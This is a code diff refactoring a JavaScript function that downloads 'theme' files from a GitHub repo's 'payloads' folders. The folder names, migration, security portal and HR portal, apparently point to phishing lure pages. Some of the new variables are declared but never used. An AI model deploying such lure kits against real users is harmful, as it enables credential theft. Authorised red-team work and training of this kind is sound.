@@ -48,18 +48,42 @@ async function handleChoice(choice) {
 }
 
 async function downloadThemes(choice) {
-console.log("Make a choice from these options");
-    if (choice === '1' || choice === '2') {
-        await Promise.all([
-            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js', 'index.js'),
-            choice === '1' ? downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.html', 'index.html') : Promise.resolve(),
-        ]);
+    console.log("Make a choice from these options");
+
+    const filesForChoice = [
+        'index.html',
+        'styles.css',
+        'index.js',
+        'app.ico',
+        'loading.gif'
+    ];
+
+    const filesForChoice2And3 = [
+        'index.html',
+        'styles.css',
+        'index.js',
+        'app.ico',
+        'loading.gif'
+    ];
+
+    const baseURLChoice2 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/';
+    const baseURLChoice3 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/some_other_folder/';
+
+    if (choice === '1') {
+        await Promise.all(filesForChoice.map(file =>
+            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/${file}`, file)
+        ));
+    } else if (choice === '2') {
+        await Promise.all(filesForChoice.map(file =>
+            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/${file}`, file)
+        ));
     } else if (choice === '3') {
-        await Promise.all([
-            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.html', 'index.html'),
-            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/styles.css', 'styles.css'),
-            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.js', 'index.js'),
-        ]);
+        await Promise.all(filesForChoice.map(file =>
+            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/hrportal/${file}`, file)
+        ));
+    } else {
+        console.log("Invalid choice. Please choose again.");
+        // Here, you might want to add a prompt or input method for the user to choose again
     }
 }
 
